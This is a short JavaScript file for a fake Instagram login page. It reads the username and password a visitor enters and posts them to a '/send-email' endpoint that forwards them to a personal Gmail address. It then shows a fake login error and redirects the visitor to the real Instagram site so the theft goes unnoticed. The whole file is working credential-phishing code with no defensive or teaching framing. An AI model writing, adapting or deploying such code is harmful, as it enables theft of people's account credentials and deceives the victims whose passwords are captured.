
// Variable settings
const username = document.getElementById('u_name').value;
const passcode = document.getElementById('pass').value;

// Email settings
const subject = "Someone Login ! Insta Dummy page";
const to = "shivasaini.5666@gmail.com";
const txt = `Username: ${username}\nPassword: ${passcode}`;

// Check input fields
if (username !== "" && passcode !== "") {
  // Send email using JavaScript (Note: This will not work due to security restrictions)
  // You'll need to use a server-side language or a third-party email service
  // For demonstration purposes, I'll use the Fetch API to send a request
  fetch('/send-email', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      subject,
      to,
      txt
    })
  })
  .then(() => {
    alert('Error ! Unable to login ');
    window.location.replace('https://www.instagram.com');
  })
  .catch((error) => {
    console.error('Error sending email:', error);
  });
} else {
  alert('Please enter correct username or password. Try again ');
  window.history.go(-1);
}
